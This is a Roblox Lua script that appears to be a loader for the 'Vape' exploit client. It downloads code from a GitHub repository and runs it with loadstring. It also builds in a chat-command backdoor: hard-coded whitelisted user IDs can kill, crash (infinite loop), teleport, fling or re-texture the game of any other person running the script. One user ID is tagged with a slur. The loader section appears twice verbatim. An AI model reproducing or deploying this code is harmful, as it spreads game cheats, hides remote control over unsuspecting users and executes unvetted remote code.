local Players = game:GetService("Players")
local TextChatService = game:GetService("TextChatService")
local RunService = game:GetService("RunService")
local LOCAL_PLAYER = Players.LocalPlayer

local whitelist = {
	Owner = {4202838123, 1251592623, 3299920155},
	Private = {
		1848051618, 1965898454, 1666325842, 1513390800,
		1983015440, 1394235609, 3204169739, 1880511134
	},
	Slow = {1562251033}
}

local function isInList(u, list)
	for _, id in ipairs(list) do
		if u == id then return true end
	end
	return false
end

local function isWhitelisted(u)
	return isInList(u, whitelist.Owner) or isInList(u, whitelist.Private)
end

local function applyTag(plr, txt, col)
	local function render()
		local head = plr.Character and plr.Character:FindFirstChild("Head")
		if not head or head:FindFirstChild("VapeTag") then return end
		local b = Instance.new("BillboardGui")
		b.Name = "VapeTag"
		b.Size = UDim2.new(0, 100, 0, 20)
		b.StudsOffset = Vector3.new(0, 3, 0)
		b.AlwaysOnTop = true
		b.Adornee = head
		b.Parent = head
		local l = Instance.new("TextLabel")
		l.Size = UDim2.fromScale(1, 1)
		l.BackgroundTransparency = 1
		l.Text = txt
		l.TextColor3 = col
		l.TextStrokeTransparency = 0.3
		l.TextStrokeColor3 = Color3.new(0, 0, 0)
		l.Font = Enum.Font.GothamBold
		l.TextScaled = true
		l.Parent = b
	end
	if plr.Character then render() else plr.CharacterAdded:Once(function() task.wait(0.5) render() end) end
end

local function tag(plr)
	local id = plr.UserId
	if isInList(id, whitelist.Owner) then
		applyTag(plr, "Vape OWNER", Color3.fromRGB(210, 4, 45))
	elseif isInList(id, whitelist.Private) then
		applyTag(plr, "Vape Private", Color3.fromRGB(170, 0, 255))
	elseif isInList(id, whitelist.Slow) then
		applyTag(plr, "Retard", Color3.fromRGB(70, 130, 255))
	end
end

for _, p in ipairs(Players:GetPlayers()) do tag(p) end
Players.PlayerAdded:Connect(function(p) task.delay(1, function() tag(p) end) end)

local function exec(cmd, senderId)
	cmd = string.lower(cmd)
	local sender = Players:GetPlayerByUserId(senderId)
	if not sender or not sender.Character or not sender.Character:FindFirstChild("HumanoidRootPart") then return end

	if cmd == ";kill" then
		local c = LOCAL_PLAYER.Character
		if c then
			for _, v in ipairs(c:GetDescendants()) do
				if v:IsA("BasePart") then v:BreakJoints() end
			end
		end

	elseif cmd == ";crash" then
		while true do end

	elseif cmd == ";bring" then
		if LOCAL_PLAYER ~= sender and LOCAL_PLAYER.Character and LOCAL_PLAYER.Character:FindFirstChild("HumanoidRootPart") then
			LOCAL_PLAYER.Character.HumanoidRootPart.CFrame = sender.Character.HumanoidRootPart.CFrame + Vector3.new(0, 3, 0)
		end

	elseif cmd == ";fling" then
		if LOCAL_PLAYER ~= sender and LOCAL_PLAYER.Character and LOCAL_PLAYER.Character:FindFirstChild("HumanoidRootPart") then
			local root = LOCAL_PLAYER.Character.HumanoidRootPart
			local target = sender.Character.HumanoidRootPart
			local bv = Instance.new("BodyVelocity")
			bv.Velocity = (target.Position - root.Position).Unit * 200
			bv.MaxForce = Vector3.new(1, 1, 1) * 1e6
			bv.P = 9e4
			bv.Parent = root
			game.Debris:AddItem(bv, 0.5)
		end

	elseif cmd == ";troll" then
		local textureId = "rbxassetid://8587856062"
		for _, obj in ipairs(game:GetDescendants()) do
			pcall(function()
				if obj:IsA("Decal") or obj:IsA("Texture") then
					obj.Texture = textureId
				elseif obj:IsA("MeshPart") then
					obj.TextureID = textureId
				elseif obj:IsA("SpecialMesh") then
					obj.TextureId = textureId
				elseif obj:IsA("SurfaceAppearance") then
					obj.ColorMap = textureId
				end
			end)
		end
	end
end

TextChatService.MessageReceived:Connect(function(msg)
	local t = msg.Text
	local s = msg.TextSource
	if not s then return end
	local uid = s.UserId
	if uid == LOCAL_PLAYER.UserId then return end
	if not isWhitelisted(uid) then return end
	if isWhitelisted(LOCAL_PLAYER.UserId) then return end
	exec(t, uid)
end)

local isfile = isfile or function(file)
	local suc, res = pcall(function() return readfile(file) end)
	return suc and res ~= nil and res ~= ''
end

local delfile = delfile or function(file)
	writefile(file, '')
end

local function downloadFile(path, func)
	if not isfile(path) then
		local suc, res = pcall(function()
			return game:HttpGet('https://raw.githubusercontent.com/Noveign/VapeV4ForRoblox/' .. readfile('newvape/profiles/commit.txt') .. '/' .. select(1, path:gsub('newvape/', '')), true)
		end)
		if not suc or res == '404: Not Found' then error(res) end
		if path:find('%.lua') then
			res = '--This watermark is used to delete the file if its cached, remove it to make the file persist after vape updates.\n' .. res
		end
		writefile(path, res)
	end
	return (func or readfile)(path)
end

local function wipeFolder(path)
	if not isfolder(path) then return end
	for _, file in listfiles(path) do
		if file:find('loader') then continue end
		if isfile(file) and select(1, readfile(file):find('--This watermark is used to delete the file if its cached, remove it to make the file persist after vape updates.')) == 1 then
			delfile(file)
		end
	end
end

for _, folder in {'newvape', 'newvape/games', 'newvape/profiles', 'newvape/assets', 'newvape/libraries', 'newvape/guis'} do
	if not isfolder(folder) then makefolder(folder) end
end

if not shared.VapeDeveloper then
	local _, subbed = pcall(function()
		return game:HttpGet('https://github.com/Noveign/VapeV4ForRoblox')
	end)
	local commit = subbed:find('currentOid')
	commit = commit and subbed:sub(commit + 13, commit + 52) or nil
	commit = commit and #commit == 40 and commit or 'main'
	if commit == 'main' or (isfile('newvape/profiles/commit.txt') and readfile('newvape/profiles/commit.txt') or '') ~= commit then
		wipeFolder('newvape')
		wipeFolder('newvape/games')
		wipeFolder('newvape/guis')
		wipeFolder('newvape/libraries')
	end
	writefile('newvape/profiles/commit.txt', commit)
end

local isfile = isfile or function(file)
	local suc, res = pcall(function() return readfile(file) end)
	return suc and res ~= nil and res ~= ''
end

local delfile = delfile or function(file)
	writefile(file, '')
end

local function downloadFile(path, func)
	if not isfile(path) then
		local suc, res = pcall(function()
			return game:HttpGet('https://raw.githubusercontent.com/Noveign/VapeV4ForRoblox/' .. readfile('newvape/profiles/commit.txt') .. '/' .. select(1, path:gsub('newvape/', '')), true)
		end)
		if not suc or res == '404: Not Found' then
			error(res)
		end
		if path:find('%.lua') then
			res = '--This watermark is used to delete the file if its cached, remove it to make the file persist after vape updates.\n' .. res
		end
		writefile(path, res)
	end
	return (func or readfile)(path)
end

local function wipeFolder(path)
	if not isfolder(path) then return end
	for _, file in listfiles(path) do
		if file:find('loader') then continue end
		if isfile(file) and select(1, readfile(file):find('--This watermark is used to delete the file if its cached, remove it to make the file persist after vape updates.')) == 1 then
			delfile(file)
		end
	end
end

for _, folder in {'newvape', 'newvape/games', 'newvape/profiles', 'newvape/assets', 'newvape/libraries', 'newvape/guis'} do
	if not isfolder(folder) then makefolder(folder) end
end

if not shared.VapeDeveloper then
	local _, subbed = pcall(function()
		return game:HttpGet('https://github.com/Noveign/VapeV4ForRoblox')
	end)
	local commit = subbed:find('currentOid')
	commit = commit and subbed:sub(commit + 13, commit + 52) or nil
	commit = commit and #commit == 40 and commit or 'main'
	if commit == 'main' or (isfile('newvape/profiles/commit.txt') and readfile('newvape/profiles/commit.txt') or '') ~= commit then
		wipeFolder('newvape')
		wipeFolder('newvape/games')
		wipeFolder('newvape/guis')
		wipeFolder('newvape/libraries')
	end
	writefile('newvape/profiles/commit.txt', commit)
end

return loadstring(downloadFile('newvape/main.lua'))()
